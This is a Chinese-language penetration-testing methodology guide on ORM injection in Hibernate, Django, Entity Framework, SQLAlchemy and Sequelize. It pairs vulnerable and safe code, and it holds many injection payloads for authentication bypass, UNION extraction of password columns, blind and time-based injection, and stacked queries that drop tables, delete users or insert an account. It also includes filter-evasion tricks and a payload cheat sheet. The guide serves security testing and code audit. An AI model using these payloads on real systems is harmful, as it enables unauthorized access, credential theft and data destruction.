# ORM 注入攻击方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供 ORM（对象关系映射）注入漏洞的标准化测试与利用流程，帮助识别和利用 Hibernate、Entity Framework、Django ORM 等框架中的注入漏洞。

## 1.2 适用范围
适用于使用 ORM 框架的 Web 应用、API 接口，包括 Java Hibernate、.NET Entity Framework、Python Django/SQLAlchemy、Node.js Sequelize 等。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责代码审计的开发人员。

---

# 第二部分：核心渗透技术专题

## 专题：ORM 注入攻击

### 2.1 技术介绍

ORM 注入是指攻击者通过构造恶意输入，操纵 ORM 框架生成的 SQL 查询，从而绕过认证、提取数据或修改数据的攻击方式。

**ORM 注入与 SQL 注入的区别：**
- ORM 注入利用的是 ORM 框架的 API，而非直接拼接 SQL
- 通常发生在动态查询、HQL/JPQL、Criteria API 等场景
- 即使使用了 ORM，不正确的使用方式仍可能导致注入

**常见危险模式：**

| ORM 框架 | 危险方法 | 说明 |
|---------|---------|------|
| Hibernate | `createQuery()` | HQL/JPQL 字符串拼接 |
| Hibernate | `createSQLQuery()` | 原生 SQL 查询 |
| Entity Framework | `SqlQuery()` | 原生 SQL 查询 |
| Django ORM | `extra()` | 额外 SQL 子句 |
| Django ORM | `raw()` | 原生 SQL 查询 |
| SQLAlchemy | `text()` | 文本 SQL |
| Sequelize | `query()` | 原生查询 |

### 2.2 攻击常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **搜索功能** | 商品搜索、用户搜索 | 动态查询条件拼接 |
| **排序功能** | 列表排序、ORDER BY | ORDER BY 子句注入 |
| **过滤功能** | 价格区间、状态筛选 | WHERE 条件拼接 |
| **报表导出** | 数据导出、统计分析 | 聚合查询注入 |
| **管理后台** | 数据管理、批量操作 | 动态查询构建 |
| **API 接口** | RESTful 查询参数 | 参数直接用于查询 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**输入点识别：**
- 搜索框
- 筛选参数（价格、日期、状态）
- 排序参数（sort、order、orderby）
- 分页参数
- API 查询参数（filter、query、where）

**初步探测 Payload：**

```
# 排序注入
sort=id;WAITFOR DELAY '0:0:5'--
orderby=1;DROP TABLE users--

# 搜索注入
search=' OR '1'='1
search=admin'--

# 过滤注入
filter[price]=100 OR 1=1
filter[name]=%' OR 1=1--

# API 查询注入
where={"$or":[{"id":1},{"id":2}]}
query=1' AND 1=1--
```

**响应判断：**
- SQL 错误信息
- 响应时间延迟
- 返回数据量异常
- 认证被绕过

#### 2.3.2 白盒测试

**代码审计关键词（Java Hibernate）：**
```java
// 危险代码 - HQL 拼接
String hql = "FROM User WHERE username = '" + userInput + "'";
Query query = session.createQuery(hql);

// 危险代码 - Criteria 动态排序
criteria.addOrder(Order.asc(userInput));  // userInput 可控

// 安全代码 - 参数化查询
String hql = "FROM User WHERE username = :username";
Query query = session.createQuery(hql);
query.setParameter("username", userInput);
```

**代码审计关键词（Python Django）：**
```python
# 危险代码
User.objects.extra(where=["username = '%s'" % user_input])
User.objects.raw("SELECT * FROM users WHERE username = '%s'" % user_input)

# 安全代码
User.objects.filter(username=user_input)
```

**代码审计关键词（.NET Entity Framework）：**
```csharp
// 危险代码
var users = db.Database.SqlQuery<User>("SELECT * FROM Users WHERE Name = '" + userInput + "'");

// 安全代码
var users = db.Users.FromSqlInterpolated($"SELECT * FROM Users WHERE Name = {userInput}");
```

### 2.4 漏洞利用方法

#### 2.4.1 认证绕过

```
# HQL 注入绕过
username=' or '1'='1'/*
password=anything

# 或
username=' UNION SELECT 1, 'admin', 'password'--
```

#### 2.4.2 ORDER BY 注入

```
# 列枚举
sort=1  # 按第 1 列排序
sort=2  # 按第 2 列排序
...

# 盲注提取
sort=(CASE WHEN (SELECT substring(username,1,1) FROM users LIMIT 1)='a' THEN id ELSE (SELECT 1 UNION SELECT 1) END)--
```

#### 2.4.3 UNION 注入

```
# 基础 UNION
search=' UNION SELECT NULL, username, password FROM users--

# 列数探测
search=' ORDER BY 1--
search=' ORDER BY 2--
search=' ORDER BY 3--
...
```

#### 2.4.4 盲注利用

```
# 布尔盲注
filter[id]=1' AND substring((SELECT password FROM users WHERE id=1),1,1)='a'--

# 时间盲注
sort=id;WAITFOR DELAY '0:0:5'--
sort=id;SELECT pg_sleep(5)--
sort=id;SELECT sleep(5)--
```

#### 2.4.5 堆叠查询

```
# 多语句执行（如果支持）
sort=id; DROP TABLE users--
sort=id; INSERT INTO users VALUES (999, 'hacker', 'password')--
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过 ORM 过滤

```
# 使用注释绕过关键字
sort=i/**/d

# 使用双写绕过
sort=ororderder by

# 使用括号
sort=(id)
```

#### 2.5.2 绕过参数化查询

某些情况下，即使使用了参数化查询，仍可能注入：

```
# LIKE 查询中的通配符
search=%' OR 1=1--

# IN 子句注入
ids=1,2,3 OR 1=1

# JSON 查询注入（NoSQL ORM）
where={"$ne": null}
```

#### 2.5.3 编码绕过

```
# URL 编码
sort=id%3BDROP%20TABLE%20users--

# Unicode 编码
sort=\u0069\u0064  # id
```

---

# 第三部分：附录

## 3.1 ORM 注入 Payload 速查表

| 类别 | Payload | 适用框架 |
|-----|---------|---------|
| **HQL 注入** | `' or '1'='1'/*` | Hibernate |
| **HQL 注入** | `' UNION SELECT ...--` | Hibernate |
| **ORDER BY** | `id;WAITFOR DELAY '0:0:5'--` | SQL Server |
| **ORDER BY** | `id;SELECT pg_sleep(5)--` | PostgreSQL |
| **ORDER BY** | `id;SELECT sleep(5)--` | MySQL |
| **Django** | `'; DROP TABLE users;--` | extra()/raw() |
| **SQLAlchemy** | `1; DELETE FROM users--` | text() |

## 3.2 各 ORM 框架危险方法汇总

| 框架 | 危险方法 | 安全替代 |
|-----|---------|---------|
| **Hibernate** | `createQuery(String)` | `createQuery(String).setParameter()` |
| **Hibernate** | `createSQLQuery(String)` | `createNativeQuery(String).setParameter()` |
| **Django** | `extra(where=[...])` | `filter()` / `exclude()` |
| **Django** | `raw(sql)` | 避免使用或使用参数 |
| **SQLAlchemy** | `text(sql)` | 使用 ORM 查询或使用绑定参数 |
| **Entity Framework** | `SqlQuery(sql)` | `FromSqlInterpolated()` |
| **Sequelize** | `query(sql)` | 使用 Model 方法或使用 replacements |
| **JPA** | `createNamedQuery()` | 使用参数绑定 |

## 3.3 常见 ORM 框架默认配置风险

| 框架 | 风险配置 | 说明 |
|-----|---------|------|
| Hibernate | `hibernate.hbm2ddl.auto=update` | 自动更新表结构 |
| Django | `DEBUG=True` | 泄露 SQL 错误信息 |
| Entity Framework | `IncludeErrorDetail=true` | 泄露详细错误 |
| SQLAlchemy | `echo=True` | 输出 SQL 日志 |

## 3.4 参考资源

- [OWASP ORM Injection](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
- [Hibernate Security Guide](https://docs.jboss.org/hibernate/orm/latest/userguide/html_single/Hibernate_User_Guide.html#security)
- [Django Security](https://docs.djangoproject.com/en/stable/topics/security/)
